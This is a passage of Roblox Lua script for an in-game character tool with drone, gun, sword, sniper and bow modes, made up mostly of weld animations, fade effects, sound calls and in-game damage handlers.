local dmsh5=mesh("SpecialMesh",dprt5,"Sphere","",vt(0,0,0),vt(0.4,0.4,0.4))
local dwld5=weld(dprt5,dprt5,dprt4,cf(0,0.5,0)*euler(0,0,0))
light1=Instance.new("PointLight")
light1.Brightness=.8
light1.Color=Color3.new(0,0,255)
light1.Range=10
light1.Parent=dprt5
numb=numb+1.57
end
return drone,dprt1
end
 
function hideanim()
equipped=false
if Mode=="Drones" then
Mode="Choose"
end
wait(0.1)
cone.Parent=nil
screen1.Parent=nil
screen2.Parent=nil
screen3.Parent=nil
Neck.C0=necko*euler(0,0,0)
wld9.C0=euler(0,0,0)*cf(0,0.05,0)
Bg.Parent=nil
end
 
function equipanim()
equipped=true
if Mode=="Choose" then
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(0.3*i,0,-0.2*i)
RW.C0=cf(1.5-0.5*i, 0.5-0.2*i, -0.5*i) * euler(1*i,0,-1*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-2.07*i,0)
LW.C0=cf(-1.5+0.3*i, 0.5, -0.3*i) * euler(1.5*i,0,1.2*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
for i=0,1,0.1 do
wait()
wld9.C0=euler(0,-1.57*i,0)*cf(0,0.05,0)
Neck.C0=necko*euler(0.3+0.1*i,0,-0.2-0.1*i)
RW.C0=cf(1, 0.3, -0.5) * euler(1-0.2*i,0,-1+0.3*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-2.07-0.1*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.5-0.2*i,0,1.2-0.5*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
coroutine.resume(coroutine.create(function()
cone.Parent=modelzorz
cone.Transparency=1
local conewld=weld(cone,cone,prt9,euler(0,0,0)*cf(0,0.2,0))
screen1.Parent=modelzorz
screen1.Transparency=1
local screen1wld=weld(screen1,screen1,cone,euler(0,0.8,0)*cf(0,1,0))
screen2.Parent=modelzorz
screen2.Transparency=1
local screen2wld=weld(screen2,screen2,screen1,cf(0,0,1)*euler(0,0.3,0))
screen3.Parent=modelzorz
screen3.Transparency=1
local screen3wld=weld(screen3,screen3,screen1,cf(0,0,-1)*euler(0,-0.3,0))
 
for i=1,0.5,-0.05 do
wait()
cone.Transparency=i
screen1.Transparency=i
screen2.Transparency=i
screen3.Transparency=i
end
coroutine.resume(coroutine.create(function(Cone,Screen1,Screen2,Screen3)
while Mode=="Choose" do
wait(0.06)
Cone.Transparency=0.5
Screen1.Transparency=0.5
Screen2.Transparency=0.5
Screen3.Transparency=0.5
light1.Brightness=.7
light2.Brightness=.7
light3.Brightness=.7
wait(0.06)
Cone.Transparency=0.6
Screen1.Transparency=0.6
Screen2.Transparency=0.6
Screen3.Transparency=0.6
light1.Brightness=.8
light2.Brightness=.8
light3.Brightness=.8
end
end),cone,screen1,screen2,screen3)
end))
for i=0,1,0.1 do
wait()
wld9.C0=euler(0,-1.57,0)*cf(0,0.05,0)
Neck.C0=necko*euler(0.4-0.7*i,0,-0.3)
RW.C0=cf(1, 0.3, -0.5-0.3*i) * euler(0.8+0.77*i,0,-1+0.3)
RW.C1=cf(0, 0.5, 0) * euler(0,-2.17+0.67*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.3+1*i,0,0.7)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
Neck.C0=necko*euler(-0.3,0,-0.3)
RW.C0=cf(1, 0.3, -0.8) * euler(1.57,0,-0.7)
RW.C1=cf(0, 0.5, 0) * euler(0,-1.5,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(2.3,0,0.7)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
end
 
function Drones()
Mode="Drones"
attack=true
Humanoid.WalkSpeed=0
coroutine.resume(coroutine.create(function()
while Mode=="Drones" do
wait()
if Aiming==false then
DroneTarget=Torso.Position
end
end
end))
coroutine.resume(coroutine.create(function(Cone,Screen1,Screen2,Screen3)
numb=0.5
for i=0,1,0.1 do
wait()
Cone.Transparency=numb
Screen1.Transparency=numb
Screen2.Transparency=numb
Screen3.Transparency=numb
numb=numb+0.1
end
Cone.Parent=nil
Screen1.Parent=nil
Screen2.Parent=nil
Screen3.Parent=nil
end),cone,screen1,screen2,screen3)
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.3+0.3*i,0,-0.3+0.3*i)
RW.C0=cf(1, 0.3, -0.8) * euler(1.57-0.3*i,0,-0.7-0.6*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1.5+0.5*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(2.3-0.8*i,0,0.7-0.5*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
local drone1,droneprt1=CreateDrone()
local dwld1=weld(droneprt1,droneprt1,Torso,euler(0,0,0)*cf(2,0,5))
local drone2,droneprt2=CreateDrone()
local dwld12=weld(droneprt2,droneprt2,Torso,euler(0,0,0)*cf(0,0,5))
local drone3,droneprt3=CreateDrone()
local dwld13=weld(droneprt3,droneprt3,Torso,euler(0,0,0)*cf(-2,0,5))
wait()
dwld1:Remove()
dwld12:Remove()
dwld13:Remove()
local pos=it("BodyPosition",droneprt1)
rand1=math.random(-5,5)
rand2=math.random(-5,5)
pos.position=Torso.Position + vt(rand1,5,rand2)
coroutine.resume(coroutine.create(function(BodyPosition)
while droneprt1.Parent~=nil do
wait(math.random(1,3))
BodyPosition.position=Torso.Position + vt(math.random(-15,15),5,math.random(-15,15))
end
end),pos)
pos.maxForce=vt(7500,7500,7500)
pos.Name="BP"
local bg=it("BodyGyro",droneprt1)
bg.maxTorque=vt(math.huge,math.huge,math.huge)
bg.P=50000
coroutine.resume(coroutine.create(function(BodyGyro)
while droneprt1.Parent~=nil do
wait()
if Aiming==true then
BodyGyro.cframe=cf(droneprt1.Position, DroneTarget)
end
end
end),bg)
bg.Name="DroneGyro"
local pos=it("BodyPosition",droneprt2)
rand1=math.random(-5,5)
rand2=math.random(-5,5)
pos.position=Torso.Position + vt(rand1,5,rand2)
coroutine.resume(coroutine.create(function(BodyPosition)
while droneprt2.Parent~=nil do
wait(math.random(1,3))
BodyPosition.position=Torso.Position + vt(math.random(-15,15),5,math.random(-15,15))
end
end),pos)
pos.maxForce=vt(7500,7500,7500)
pos.Name="BP"
local bg=it("BodyGyro",droneprt2)
bg.maxTorque=vt(math.huge,math.huge,math.huge)
bg.P=50000
coroutine.resume(coroutine.create(function(BodyGyro)
while droneprt2.Parent~=nil do
wait()
if Aiming==true then
BodyGyro.cframe=cf(droneprt2.Position, DroneTarget)
end
end
end),bg)
bg.Name="DroneGyro"
local pos=it("BodyPosition",droneprt3)
rand1=math.random(-5,5)
rand2=math.random(-5,5)
pos.position=Torso.Position + vt(rand1,5,rand2)
coroutine.resume(coroutine.create(function(BodyPosition)
while droneprt3.Parent~=nil do
wait(math.random(1,3))
BodyPosition.position=Torso.Position + vt(math.random(-15,15),5,math.random(-15,15))
end
end),pos)
pos.maxForce=vt(7500,7500,7500)
pos.Name="BP"
local bg=it("BodyGyro",droneprt3)
bg.maxTorque=vt(math.huge,math.huge,math.huge)
bg.P=50000
--bg.cframe=cf(droneprt1.Position, Torso.Position)
coroutine.resume(coroutine.create(function(BodyGyro)
while droneprt3.Parent~=nil do
wait()
if Aiming==true then
BodyGyro.cframe=cf(droneprt3.Position, DroneTarget)
end
end
end),bg)
bg.Name="DroneGyro"
droneprt1.Anchored=true
for _,v in pairs(drone1:children()) do
if v.className=="Part" then
v.Transparency=1
coroutine.resume(coroutine.create(function(Part)
wait(1)
Part.Transparency=0
end),v)
end
end
effect=drone1:Clone()
effect.Parent=workspace
print(effect)
for _,v in pairs(effect:children()) do
if v.className=="Part" then
v.Transparency=1
v.Anchored=true
v.CanCollide=false
v.BrickColor=BrickColor.new("Bright blue")
coroutine.resume(coroutine.create(function(Part)
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency-0.05
end
wait(0.5)
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.05
end
Part.Parent=nil
end),v)
end
end
droneprt2.Anchored=true
for _,v in pairs(drone2:children()) do
if v.className=="Part" then
v.Transparency=1
coroutine.resume(coroutine.create(function(Part)
wait(1)
Part.Transparency=0
end),v)
end
end
effect=drone2:Clone()
effect.Parent=workspace
print(effect)
for _,v in pairs(effect:children()) do
if v.className=="Part" then
v.Transparency=1
v.Anchored=true
v.CanCollide=false
v.BrickColor=BrickColor.new("Bright blue")
coroutine.resume(coroutine.create(function(Part)
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency-0.05
end
wait(0.5)
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.05
end
Part.Parent=nil
end),v)
end
end
droneprt3.Anchored=true
for _,v in pairs(drone3:children()) do
if v.className=="Part" then
v.Transparency=1
coroutine.resume(coroutine.create(function(Part)
wait(1)
Part.Transparency=0
end),v)
end
end
effect=drone3:Clone()
effect.Parent=workspace
print(effect)
for _,v in pairs(effect:children()) do
if v.className=="Part" then
v.Transparency=1
v.Anchored=true
v.CanCollide=false
v.BrickColor=BrickColor.new("Bright blue")
coroutine.resume(coroutine.create(function(Part)
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency-0.05
end
wait(0.5)
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.05
end
Part.Parent=nil
end),v)
end
end
wait(2)
droneprt1.Anchored=false
droneprt2.Anchored=false
droneprt3.Anchored=false
Humanoid.WalkSpeed=16
wait()
effect.Parent=nil
for i=0,1,0.1 do
wait()
RW.C0=cf(1+0.5*i, 0.3+0.2*i, -0.8+0.8*i) * euler(1.27-0.77*i,0,-1.3+1.3*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1+1*i,0)
LW.C0=cf(-1.2-0.3*i, 0.5, -0.3+0.3*i) * euler(1.5-1.5*i,0,0.2-0.4*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
attack=false
return drone1, drone2, drone3
end
 
function Gun()
attack=true
Mode="Gun"
gwld1.Part1=LeftArm
gwld1.C0=euler(1.57+0.5,0,-1.57)*cf(0,1,0)
coroutine.resume(coroutine.create(function(Cone,Screen1,Screen2,Screen3)
numb=0.5
for i=0,1,0.1 do
wait()
Cone.Transparency=numb
Screen1.Transparency=numb
Screen2.Transparency=numb
Screen3.Transparency=numb
numb=numb+0.1
end
Cone.Parent=nil
Screen1.Parent=nil
Screen2.Parent=nil
Screen3.Parent=nil
end),cone,screen1,screen2,screen3)
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.3+0.3*i,0,-0.3+0.3*i)
RW.C0=cf(1, 0.3, -0.8) * euler(1.57-0.3*i,0,-0.7-0.6*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1.5+0.5*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(2.3-0.8*i,0,0.7-0.5*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
gun.Parent=modelzorz
for e=1,#GunWelds do
GunWelds[e].Parent=modelzorz
end
for _,v in pairs(gun:children()) do
if v.className=="Part" then
v.Transparency=1
end
end
for _,v in pairs(gun:children()) do
if v.className=="Part" then
v.Transparency=1
coroutine.resume(coroutine.create(function(Part)
wait(0.5)
Part.Transparency=0
end),v)
end
end
effect=gun:Clone()
effect.Parent=workspace
print(effect)
for _,v in pairs(effect:children()) do
if v.className=="Part" then
v.Transparency=1
v.Anchored=true
v.CanCollide=false
v.BrickColor=BrickColor.new("Bright blue")
coroutine.resume(coroutine.create(function(Part)
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency-0.05
end
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.05
end
Part.Parent=nil
effect.Parent=nil
end),v)
end
end
wait(0.5)
gwld1.Part1=LeftArm
gwld1.C0=euler(1.57+0.5,0,-1.57)*cf(0,1,0)
for i=0,1,0.1 do
wait()
gwld1.C0=euler(1.57+0.5,0,-1.57+1.57*i)*cf(0,1,0)
RW.C0=cf(1+0.5*i, 0.3+0.2*i, -0.8+0.8*i) * euler(1.27-1.27*i,0,-1.3+1.5*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1+1*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.5-1*i,0,0.2+0.4*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57*i,0)
end
attack=false
end
 
function Sword()
attack=true
Mode="Sword"
swld1.Part1=LeftArm
swld1.C0=euler(0,0,-1.57)*cf(0,1,0)
swld1.C1=euler(0,0,0)
coroutine.resume(coroutine.create(function(Cone,Screen1,Screen2,Screen3)
numb=0.5
for i=0,1,0.1 do
wait()
Cone.Transparency=numb
Screen1.Transparency=numb
Screen2.Transparency=numb
Screen3.Transparency=numb
numb=numb+0.1
end
Cone.Parent=nil
Screen1.Parent=nil
Screen2.Parent=nil
Screen3.Parent=nil
end),cone,screen1,screen2,screen3)
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.3+0.3*i,0,-0.3+0.3*i)
RW.C0=cf(1, 0.3, -0.8) * euler(1.57-0.3*i,0,-0.7-0.6*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1.5+0.5*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(2.3-0.8*i,0,0.7-0.5*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
sword.Parent=modelzorz
for e=1,#SwordWelds do
SwordWelds[e].Parent=modelzorz
end
for _,v in pairs(sword:children()) do
if v.className=="Part" and v.Name~="Hitbox" and v.Name~="Mid" then
v.Transparency=1
end
end
for _,v in pairs(sword:children()) do
if v.className=="Part" and v.Name~="Hitbox" and v.Name~="Mid" then
v.Transparency=1
coroutine.resume(coroutine.create(function(Part)
wait(0.5)
Part.Transparency=0
end),v)
end
end
effect=sword:Clone()
effect.Parent=workspace
print(effect)
for _,v in pairs(effect:children()) do
if v.className=="Part" and v.Name~="Hitbox" and v.Name~="Mid" then
v.Transparency=1
v.Anchored=true
v.CanCollide=false
v.BrickColor=BrickColor.new("Bright blue")
coroutine.resume(coroutine.create(function(Part)
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency-0.05
end
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.05
end
Part.Parent=nil
effect.Parent=nil
end),v)
end
end
wait(0.5)
for i=0,1,0.1 do
wait()
swld1.C0=euler(0,-1.57*i,1.57-3.14*i)*cf(0,1,0)
swld1.C1=euler(0,1.57*i,0)
RW.C0=cf(1+0.5*i, 0.3+0.2*i, -0.8+0.8*i) * euler(1.27-1.27*i,0,-1.3+1.5*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1+1*i,0)
LW.C0=cf(-1.2-0.3*i, 0.5, -0.3+0.3*i) * euler(1.5-1.5*i,0,0.2-0.6*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
attack=false
end
 
function Sniper()
attack=true
Mode="Sniper"
snwld1.Part1=LeftArm
snwld1.C0=euler(0.5,0,0)*cf(0,1.6,-2)
coroutine.resume(coroutine.create(function(Cone,Screen1,Screen2,Screen3)
numb=0.5
for i=0,1,0.1 do
wait()
Cone.Transparency=numb
Screen1.Transparency=numb
Screen2.Transparency=numb
Screen3.Transparency=numb
numb=numb+0.1
end
Cone.Parent=nil
Screen1.Parent=nil
Screen2.Parent=nil
Screen3.Parent=nil
end),cone,screen1,screen2,screen3)
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.3+0.3*i,0,-0.3+0.3*i)
RW.C0=cf(1, 0.3, -0.8) * euler(1.57-0.3*i,0,-0.7-0.6*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1.5+0.5*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(2.3-0.8*i,0,0.7-0.5*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
sniper.Parent=modelzorz
for e=1,#SniperWelds do
SniperWelds[e].Parent=modelzorz
end
for _,v in pairs(sniper:children()) do
if v.className=="Part" then
v.Transparency=1
end
end
for _,v in pairs(sniper:children()) do
if v.className=="Part" then
v.Transparency=1
coroutine.resume(coroutine.create(function(Part)
wait(0.5)
Part.Transparency=0
end),v)
end
end
effect=sniper:Clone()
effect.Parent=workspace
print(effect)
for _,v in pairs(effect:children()) do
if v.className=="Part" then
v.Transparency=1
v.Anchored=true
v.CanCollide=false
v.BrickColor=BrickColor.new("Bright blue")
coroutine.resume(coroutine.create(function(Part)
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency-0.05
end
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.05
end
Part.Parent=nil
effect.Parent=nil
end),v)
end
end
wait(0.5)
gwld1.Part1=LeftArm
snwld1.C0=euler(0.5,0,0)*cf(0,1.6,-2)
snwld1.C1=cf(0,0,0)
for i=0,1,0.1 do
wait()
snwld1.C0=euler(0.5+1.57*i,0,0)*cf(0,1.6-0.6*i,-2+2*i)
RW.C0=cf(1, 0.3, -0.8+0.3*i) * euler(1.27-0.37*i,0,-1.3+1*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1+2.3*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57-0.5*i,0,0.2+0.5*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
attack=false
end
 
function Shoot()
attack=true
Humanoid.WalkSpeed=2
Bg.Parent=Head
Bg.cframe=Head.CFrame
for i=0,1,0.2 do
wait()
Neck.C0=necko*euler(0,0,0.785*i)
RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(0.5+1.07*i,0,0.6-1.385*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57-1.57*i,0)
end
spread=1
range=50
rangepower=70
while hold==true and Bullets~=0 do
for i=1,5 do
wait(0.05)
Bullets=Bullets-1
so("http://roblox.com/asset/?id=10209257",gprt16,0.5,1+math.random())
coroutine.resume(coroutine.create(function()
for z = 1 ,2 do
coroutine.resume(coroutine.create(function()
local meshb1 = Instance.new("BlockMesh")
meshb1.Scale = Vector3.new(1,1,1)
light = Instance.new("PointLight")
light.Brightness = .8
light.Color = Color3.new(100,50,0)
light.Range = 10
local shellb1 = Instance.new("Part")
light.Parent = shellb1
meshb1.Parent = shellb1
shellb1.Anchored = true
shellb1.formFactor = 3
shellb1.Size = Vector3.new(0.3,0.3,0.3) * (math.random(100,300)/100)
shellb1.CFrame = CFrame.new((gprt16.CFrame * CFrame.new(0,-gprt16.Size.y/2,0)).p) * CFrame.Angles(math.random(-100,100)/100,math.random(-100,100)/100,math.random(-100,100)/100)
shellb1.Parent = Character
shellb1.Transparency = 0
if math.random(1,2) == 1 then
shellb1.BrickColor = BrickColor.new("Bright red")
else
shellb1.BrickColor = BrickColor.new("Bright orange")
end
shellb1.CanCollide = false
local incre = math.random(0,60)/100
for i = 0 , 1 , 0.1 do
wait()
light.Brightness = light.Brightness - .1
shellb1.CFrame = shellb1.CFrame + Head.CFrame.lookVector*incre
shellb1.Transparency = 1*i
meshb1.Scale = Vector3.new(1+1*i,1+1*i,1+1*i)
end
shellb1.Parent=nil
end))
end
end))
shoottrail(MMouse.Hit.p,gprt16,5,1,1)
LW.C1=cf(0, 0.5, 0) * euler(-0.2,0,0)
wait(0.05)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
end
spread=0
range=500
rangepower=50
if Bullets==0 then
for i=0,1,0.2 do
wait(0)
gwld13.C0=cf(0,0,0.3)*euler(0,1.57-1.57*i,0)
end
wait(0.2)
Humanoid.WalkSpeed=16
Bg.Parent=nil
for i=0,1,0.1 do
wait()
gwld1.C0=euler(1.57+0.5,0,-1.57*i)*cf(0,1,0)
Neck.C0=necko*euler(0.3*i,0,0.785-0.785*i)
RW.C0=cf(1.5-0.5*i, 0.5, -0.5*i) * euler(1.2*i,0,0.2-0.4*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.2+0.2*i, 0.5, -0.3-0.2*i) * euler(1.57-0.57*i,0,-0.785+0.785*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
for i=0,1,0.1 do
wait()
gwld20.C0=cf(0.3*i,-0.8-0.2*i,0)*euler(0,0,1.57*i)
RW.C0=cf(1, 0.5, -0.5) * euler(1.2-0.3*i,0,-0.2-0.1*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
for i=0,1,0.2 do
wait()
Neck.C0=necko*euler(0.3+0.2*i,0,-0.5*i)
RW.C0=cf(1+0.5*i, 0.5, -0.5+0.5*i) * euler(0.9-1.3*i,0,-0.3)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
local ammo=Instance.new("Model")
ammo.Parent=modelzorz
ammo.Name="Ammo"
local aprt1=part(3,ammo,0,0,BrickColor.new("Dark stone grey"),"Part1",vt(1,1,1))
local amsh1=mesh("CylinderMesh",aprt1,"","",vt(0,0,0),vt(0.7,0.2,0.7))
local awld1=weld(aprt1,aprt1,RightArm,cf(0,1,0))
numb=0
for i=1,10 do
local aprt2=part(3,ammo,0,0,BrickColor.new("Bright yellow"),"Part2",vt(1,1,1))
local amsh2=mesh("CylinderMesh",aprt2,"","",vt(0,0,0),vt(0.2,0.3,0.2))
local awld2=weld(aprt2,aprt2,aprt1,cf(0.2,0.1,0)*euler(0,numb,0))
numb=numb+0.628
end
for i=0,1,0.2 do
wait()
awld1.C0=euler(1.57,0,0)*cf(0,1+0.1*i,0)
Neck.C0=necko*euler(0.5-0.2*i,0,-0.5+0.5*i)
RW.C0=cf(1.5-0.5*i, 0.5, -0.5*i) * euler(-0.4+1.5*i,0,-0.3-0.1*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
ammo.Parent=nil
for i=0,1,0.2 do
wait()
gwld20.C0=cf(0.3-0.3*i,-0.8-0.2+0.2*i,0)*euler(0,0,1.57-1.57*i)
Neck.C0=necko*euler(0.3-0.1*i,0,-0.2*i)
RW.C0=cf(1.5-0.5, 0.5, -0.5) * euler(1.1+0.1*i,0,-0.4+0.4*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
for i=0,1,0.1 do
wait()
gwld1.C0=euler(1.57+0.5,0,-1.57+1.57*i)*cf(0,1,0)
gwld13.C0=cf(0,0,0.3)*euler(0,1.57*i,0)
Neck.C0=necko*euler(0.2-0.2*i,0,-0.2+0.2*i)
RW.C0=cf(1.5-0.5+0.5*i, 0.5, -0.5+0.5*i) * euler(1.2-1.2*i,0,0.2*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1-0.2*i, 0.5, -0.5+0.2*i) * euler(1-0.5*i,0,0.6*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57*i,0)
end
Bullets=10
else
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(0,0,0.785-0.785*i)
RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57-1.57*i,0,-0.785+1.385*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57*i,0)
end
Neck.C0=necko
RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(0.5,0,0.6)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
end
Bg.Parent=nil
Humanoid.WalkSpeed=16
attack=false
end
 
function slash1()
attack=true
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(-0.4*i,0,-0.4-0.2*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1*i,0)
end
Bg.Parent=Head
Bg.cframe=Head.CFrame
con1=sprt16.Touched:connect(function(hit) Damagefunc1(hit,20,10) end)
so("http://roblox.com/asset/?id=10209640",LeftArm,1,1)
for i=0,1,0.2 do
wait()
Neck.C0=necko*euler(0,0,0.785*i)
swld1.C0=euler(0.5*i,-1.57,-1.57)*cf(0,1,0)
RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5+0.5*i, 0.5, -0.5*i) * euler(-0.4+2.4*i,0,-0.6+1.4*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1,0)
end
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5+0.5, 0.5, -0.5) * euler(2,0,0.8+0.2*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1,0)
end
con1:disconnect()
wait()
attack=false
end
 
function slash2()
attack=true
CF=Head.CFrame
con1=sprt16.Touched:connect(function(hit) Damagefunc1(hit,10,10) end)
so("http://roblox.com/asset/?id=10209640",LeftArm,1,1.5)
for i=0,1,0.2 do
wait()
swld1.C0=euler(0.5-0.5*i,-1.57,-1.57)*cf(0,1,0)
RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1-0.5*i, 0.5, -0.5+0.5*i) * euler(2-0.43*i,0,1-2.57*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1+.57*i,0)
Bg.cframe=CF*euler(0,3.14*i,0)
end
so("http://roblox.com/asset/?id=10209640",LeftArm,1,1.5)
for i=0,1,0.2 do
wait()
swld1.C0=euler(-0.5*i,-1.57,-1.57)*cf(0,1,0)
Bg.cframe=CF*euler(0,3.14+3.14*i,0)
end
con1:disconnect()
wait()
attack=false
end
 
function slash3()
attack=true
Bg.Parent=nil
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(0,0,0.785-0.785*i)
swld1.C0=euler(-0.5+0.5*i,-1.57,-1.57)*cf(0,1,0)
RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(1.57+.43*i,0,-1.57+1*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57-2.07*i,0)
end
con1=sprt16.Touched:connect(function(hit) Damagefunc1(hit,20,10) end)
so("http://roblox.com/asset/?id=10209640",LeftArm,1,0.9)
for i=0,1,0.2 do
wait()
Neck.C0=necko*euler(0.3*i,0,-0.2*i)
swld1.C0=euler(-0.3*i,-1.57,-1.57)*cf(0,1,0)
RW.C0=cf(1.5, 0.5, 0) * euler(-0.5*i,0,0.2+0.2*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5+1.5*i, 0.5-0.2*i, -1*i) * euler(2-1.5*i,0,-.57+1.07*i)
LW.C1=cf(0, 0.5, 0) * euler(0,-.5,0)
end
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5, 0.5, 0) * euler(-0.5,0,0.4)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(0, 0.3, -1) * euler(.5-.2*i,0,.5)
LW.C1=cf(0, 0.5, 0) * euler(0,-.5,0)
end
con1:disconnect()
wait()
attack=false
end
 
function BowShoot()
attack=true
BowAim=true
HeadNumb=0
Humanoid.WalkSpeed=2
coroutine.resume(coroutine.create(function(FenNeck)
while BowAim==true do
wait()
local pos4 = vt(workspace.CurrentCamera.CoordinateFrame.X,Head.Position.Y,workspace.CurrentCamera.CoordinateFrame.Z)
Bg.cframe = cf(Head.Position,pos4) * euler(0,3.14-HeadNumb,0) * cf(0,0,0) --cf(Torso.Position,MMouse.Hit.p) *
Bg.Parent = Torso
offset=(Torso.Position.y-MMouse.Hit.p.y)/60
mag=(Torso.Position-MMouse.Hit.p).magnitude/80
offset=offset/mag
FenNeck.C1=necko2*euler(-offset,0,0)
end
end),Neck)
for i=0,1,0.1 do
wait()
HeadNumb=1.57*i
swld1.C0=euler(0,-1.57+0.3*i,-1.57)*cf(0,1,0)
Neck.C0=necko*euler(0,0,HeadNumb)
RW.C0=cf(1.5-2.5*i, 0.5, -1*i) * euler(1.57*i,0,0.2-1.97*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(1.57*i,0,-0.4-0.87*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
 
local string1=part(3,sword,0,1,BrickColor.new("Bright yellow"),"String1",vt(0.5,1,0.5))
local stringmsh1=mesh("CylinderMesh",string1,"","",vt(0,0,0),vt(0.1,1,0.1))
local stringwld1=weld(string1,string1,prt17,euler(0,0,0)*cf(0,0,0))
local string2=part(3,sword,0,1,BrickColor.new("Bright yellow"),"String2",vt(0.5,1,0.5))
local stringmsh2=mesh("CylinderMesh",string2,"","",vt(0,0,0),vt(0.1,1,0.1))
local stringwld2=weld(string2,string2,prt19,euler(0,0,0)*cf(0,0,0))
table.insert(SwordWelds,stringwld1)
table.insert(SwordWelds,stringwld1)
coroutine.resume(coroutine.create(function(String1,String2)
for i=0,1,0.1 do
wait()
String1.Transparency=String1.Transparency-0.05
String2.Transparency=String2.Transparency-0.05
end
end),string1,string2)
 
local strmdl = "Arrow"
coroutine.resume(coroutine.create(function()
arrowdebounce=false
repeat
wait(0)
coroutine.resume(coroutine.create(function()
if arrowdebounce==false then
